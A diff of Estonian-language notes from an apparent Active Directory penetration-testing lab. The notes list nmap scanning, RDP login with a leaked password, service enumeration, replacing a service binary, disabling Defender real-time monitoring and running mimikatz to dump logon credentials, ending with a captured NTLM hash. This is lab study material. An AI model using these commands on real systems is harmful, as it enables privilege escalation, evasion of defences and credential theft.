@@ -92,10 +92,11 @@ Eeldus: Meil on domeeni kasutaja
 7. Me asendame mysqld exe oma custom failiga ja teeme restardi, et see sisse laetaks
 8. Teeme uue rdp ühenduse uue loodud admin kontoga
 
-Kali 192.168.1.101
-DC01 192.168.1.2 (LDAP 3268/tcp)
-server1 192.168.1.17 (RDP 3389/tcp)
+
 sudo nmap -sV -O 192.168.1.0/24 otsime AD masinat
+  Kali 192.168.1.101
+  DC01 192.168.1.2 (LDAP 3268/tcp)
+  server1 192.168.1.17 (RDP 3389/tcp)
 Kompromiseeritud masinas lekkinud kasutajaga whoami /groups et näha kasutaja gruppe
 sudo xfreerdp3 /u:henry /p:'V4hetaM1nd.' /d:contoso /v:192.168.1.17 Proovime kas kasutajal on õigus ühenduda RDPga
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object State -like "Running" vaatame jooksvaid teenuseid
@@ -126,4 +127,5 @@ Set-MpPreference -DisableRealtimeMonitoring $true (Keerame defenderi kinni admin
 powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true" (sama asi läbi admin cmd)
 Käivitame mimikatzi (admin term)
   privilege::debug (tõstame õigusi, et saaks lugeda mälu)
-  
+  sekurlsa::logonpasswords
+    NTLM: c625e3e2756d9ef01881fa7ed46b49a8
